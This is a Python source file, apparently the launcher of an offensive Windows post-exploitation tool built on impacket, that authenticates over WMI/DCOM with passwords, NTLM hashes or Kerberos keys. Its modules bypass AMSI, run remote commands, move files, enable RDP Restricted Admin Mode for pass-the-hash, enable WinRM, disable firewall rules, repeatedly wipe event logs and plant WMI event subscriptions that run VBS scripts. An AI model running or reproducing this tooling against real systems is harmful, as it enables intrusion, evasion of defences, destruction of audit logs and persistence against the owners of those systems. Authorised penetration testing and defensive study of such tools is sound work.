from __future__ import division
from __future__ import print_function
import struct
import sys
import zlib
import base64
import os
import cmd
import argparse
import time
import logging

from lib.modules.amsi import AMSI
from lib.modules.exec_command import EXEC_COMMAND
from lib.modules.filetransfer import filetransfer_Toolkit
from lib.modules.rdp import RDP_Toolkit
from lib.modules.winrm import WINRM_Toolkit
from lib.modules.firewall import Firewall_Toolkit
from lib.modules.eventlog_fucker import eventlog_Toolkit
from lib.methods.executeVBS import executeVBS_Toolkit
from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket import version
from impacket.dcerpc.v5.dcomrt import DCOMConnection, COMVERSION, OBJREF_CUSTOM
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dcom.wmi import ENCODING_UNIT
from impacket.dcerpc.v5.dtypes import NULL, NDRPOINTERNULL
from impacket.krb5.keytab import Keytab
from six import PY2

WBEM_FLAG_CREATE_ONLY = 0x00000002

OUTPUT_FILENAME = '__' + str(time.time())
CODEC = sys.stdout.encoding

class WMIEXEC:
    def __init__(self, username='', password='', domain='', hashes=None, aesKey=None, doKerberos=False, kdcHost=None, options=None):
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__options = options
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def run(self, addr):
        dcom = DCOMConnection(addr, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                              self.__aesKey, oxidResolver=True, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
        try:
            iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            
            if self.__options.module == "amsi":
                executer_AMSI = AMSI(iWbemLevel1Login)
                if self.__options.enable == True and self.__options.disable == False:
                    executer_AMSI.amsi_Wrapper("enable")
                elif self.__options.disable == True and self.__options.enable == False:
                    executer_AMSI.amsi_Wrapper("disable")
                else:
                    print("[-] Wrong operation")
            
            if self.__options.module == "exec-command":
                executer_ExecCommand = EXEC_COMMAND(iWbemLevel1Login)
                if self.__options.command != None and self.__options.with_output == False:
                    executer_ExecCommand.exec_command_silent(command=self.__options.command)
                elif self.__options.command != None and self.__options.with_output == True:
                    if self.__options.save == True:
                        executer_ExecCommand.exec_command_WithOutput(command=self.__options.command, save_Result=True, hostname=addr)
                    else:
                        executer_ExecCommand.exec_command_WithOutput(command=self.__options.command)
                elif self.__options.clear == True:
                    executer_ExecCommand.clear()
                else:
                    print("[-] Wrong operation")
            
            if self.__options.module == "filetransfer":
                executer_Transfer = filetransfer_Toolkit(iWbemLevel1Login)
                if self.__options.upload == True:
                    executer_Transfer.uploadFile(src_File=self.__options.src_file, dest_File=r'%s'%self.__options.dest_file)
                elif self.__options.download == True:
                    executer_Transfer.downloadFile(target_File=r'%s'%self.__options.src_file, save_Location=self.__options.dest_file)
                else:
                    print("[-] Wrong operation")
            
            if self.__options.module == "rdp":
                executer_RDP = RDP_Toolkit(iWbemLevel1Login)
                if self.__options.enable == True:
                    executer_RDP.rdp_Wrapper("enable")
                elif self.__options.disable == True:
                    executer_RDP.rdp_Wrapper("disable")
                elif self.__options.enable_ram == True:
                    executer_RDP.ram_Wrapper("enable")
                elif self.__options.disable_ram == True:
                    executer_RDP.ram_Wrapper("disable")
                else:
                    print("[-] Wrong operation")

            if self.__options.module == "winrm":
                executer_WINRM = WINRM_Toolkit(iWbemLevel1Login)
                if self.__options.enable == True:
                    executer_WINRM.WINRM_Wrapper("enable")
                elif self.__options.disable == True:
                    executer_WINRM.WINRM_Wrapper("disable")
                else:
                    print("[-] Wrong operation")
            
            if self.__options.module == "firewall":
                executer_Firewall = Firewall_Toolkit(iWbemLevel1Login)
                if self.__options.search_port:
                    executer_Firewall.port_Searcher(self.__options.search_port)
                elif self.__options.dump:
                    executer_Firewall.dump_FirewallRules(self.__options.dump)
                elif self.__options.rule_id and self.__options.rule_op:
                    executer_Firewall.rule_Controller(ID=self.__options.rule_id, flag=self.__options.rule_op)
                elif self.__options.firewall_profile:
                    executer_Firewall.FirewallProfile_Controller(self.__options.firewall_profile)
                else:
                    print("[-] Wrong operation")

            if self.__options.module == "eventlog":
                executer_EventLog = eventlog_Toolkit(iWbemLevel1Login)
                if self.__options.risk_i_know == True:
                    executer_EventLog.fuck_EventLog()
                elif self.__options.retrieve:
                    executer_EventLog.retrieve_EventLog(self.__options.retrieve)
                else:
                    print("[-] Wrong operation")
            
            if self.__options.module == "execute-vbs":
                executer_VBS = executeVBS_Toolkit(iWbemLevel1Login)
                if self.__options.vbs != "" and self.__options.filter != "":
                    executer_VBS.ExecuteVBS(vbs_file=self.__options.vbs, filer_Query=self.__options.filter)
                elif self.__options.vbs != "" and self.__options.timer != "":
                    executer_VBS.ExecuteVBS(vbs_file=self.__options.vbs, timer=self.__options.timer)
                elif self.__options.remove:
                    executer_VBS.remove_Event(self.__options.remove)
                else:
                    print("[-] Wrong operation")

        except  (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(str(e))
            dcom.disconnect()
            sys.exit(1)
        
        dcom.disconnect()

if __name__ == '__main__':
    print(version.BANNER)

    parser = argparse.ArgumentParser(add_help=True, description="Executes a semi-interactive shell using Windows "
                                                                "Management Instrumentation.")
    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-codec', action='store', help='Sets encoding used (codec) from the target\'s output (default '
                                                       '"%s"). If errors are detected, run chcp.com at the target, '
                                                       'map the result with '
                                                       'https://docs.python.org/3/library/codecs.html#standard-encodings and then execute wmiexec.py '
                                                       'again with -codec and the corresponding codec ' % CODEC)
    parser.add_argument('-com-version', action='store', metavar="MAJOR_VERSION:MINOR_VERSION",
                        help='DCOM version, format is MAJOR_VERSION:MINOR_VERSION e.g. 5.7')
    subparsers = parser.add_subparsers(help='modules', dest='module')

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true",
                       help='Use Kerberos authentication. Grabs credentials from ccache file '
                            '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
                            'ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication '
                                                                          '(128 or 256 bits)')
    group.add_argument('-dc-ip', action='store', metavar="ip address", help='IP Address of the domain controller. If '
                                                                            'ommited it use the domain part (FQDN) specified in the target parameter')
    group.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')

    # amsi.py
    amsi_parser = subparsers.add_parser('amsi', help='Bypass AMSI with registry key "AmsiEnable".')
    amsi_parser.add_argument('-enable', action='store_true', help='Enable AMSI bypass')
    amsi_parser.add_argument('-disable', action='store_true', help='Disable AMSI bypass')

    # exec_command.py
    exec_command = subparsers.add_parser('exec-command', help='Execute command in with/without output way.')
    exec_command.add_argument('-command', action='store', help='Specify command to execute')
    exec_command.add_argument('-with-output', action='store_true', help='Command execute with output (default is no output)')
    exec_command.add_argument('-save', action='store_true', help='Save command output to file (only support in "-with-output" mode)')
    exec_command.add_argument('-clear', action='store_true', help='Remove temporary class for command result storage')

    # filetransfer.py
    file_transfer = subparsers.add_parser('filetransfer', help='Upload/Download file through wmi class.')
    file_transfer.add_argument('-upload', action='store_true', help='Upload file.')
    file_transfer.add_argument('-download', action='store_true', help='Download file.')
    file_transfer.add_argument('-src-file', action='store', required=True, help='Source file with fully path (include filename)')
    file_transfer.add_argument('-dest-file', action='store', required=True, help='Dest file with fully path (include filename)')
    
    # rdp.py
    rdp_parser = subparsers.add_parser('rdp', help='Enable/Disable Remote desktop service.')
    rdp_parser.add_argument('-enable', action='store_true', help='Enable RDP service')
    rdp_parser.add_argument('-enable-ram', action='store_true', help='Enable Restricted Admin Mode for PTH')
    rdp_parser.add_argument('-disable', action='store_true', help='Disable RDP service')
    rdp_parser.add_argument('-disable-ram', action='store_true', help='Disable Restricted Admin Mode')

    # winrm.py
    winrm_parser = subparsers.add_parser('winrm', help='Enable/Disable WINRM service.')
    winrm_parser.add_argument('-enable', action='store_true', help='Enable WINRM service')
    winrm_parser.add_argument('-disable', action='store_true', help='Disable WINRM service')

    # firewall.py
    firewall_parser = subparsers.add_parser('firewall', help='Firewall abusing.')
    firewall_parser.add_argument('-search-port', action='store', metavar="port num", help='Search rules associate with the port.')
    firewall_parser.add_argument('-dump', action='store', help='Dump all firewall rules to file as json type.')
    firewall_parser.add_argument('-rule-id', action='store', metavar="ID", help='Specify firewall rule instance id to do operation in "-rule-op"')
    firewall_parser.add_argument('-rule-op', action='store', default='disable', choices=['enable', 'disable', 'remove'],
                                 help='Operation in firewall rule which you can control')
    firewall_parser.add_argument('-firewall-profile', action='store', choices=['enable','disable'],
                                 help='Use it on your own risk if you try to do this one.')
    
    # Eventlog-fucker.py
    eventlog_parser = subparsers.add_parser('eventlog', help='Loopping cleanning eventlog.')
    eventlog_parser.add_argument('-risk-i-know', action='store_true', help='You know what will happen :)')
    eventlog_parser.add_argument('-retrieve', action='store', metavar="ID", help='Stop looping cleaning eventlog with the instance id.')

    # executeVBS.py
    execute_VBSParser = subparsers.add_parser('execute-vbs', help='Execute vbs file.')
    execute_VBSParser.add_argument('-vbs', action="store", required=True, help='VBS filename containing the script you want to run')
    execute_VBSParser.add_argument('-filter', action="store", help='The WQL filter string that will trigger the script.')
    execute_VBSParser.add_argument('-timer', action='store', required=False, help='The amount of milliseconds after the script will be triggered'
                                    '1000 milliseconds = 1 second')
    execute_VBSParser.add_argument('-remove', action="store", help='Remove wmi event with ID.')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    # Init the example's logger theme
    logger.init(options.ts)

    if options.codec is not None:
        CODEC = options.codec
    else:
        if CODEC is None:
            CODEC = 'utf-8'

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    if options.com_version is not None:
        try:
            major_version, minor_version = options.com_version.split('.')
            COMVERSION.set_default_version(int(major_version), int(minor_version))
        except Exception:
            logging.error("Wrong COMVERSION format, use dot separated integers e.g. \"5.7\"")
            sys.exit(1)

    domain, username, password, address = parse_target(options.target)

    try:
        if domain is None:
            domain = ''

        if options.keytab is not None:
            Keytab.loadKeysFromKeytab(options.keytab, username, domain, options)
            options.k = True

        if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
            from getpass import getpass

            password = getpass("Password:")

        if options.aesKey is not None:
            options.k = True

        executer = WMIEXEC(username, password, domain, options.hashes, options.aesKey, options.k, options.dc_ip, options)
        executer.run(address)
    except KeyboardInterrupt as e:
        logging.error(str(e))
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(str(e))
        sys.exit(1)

    sys.exit(0)
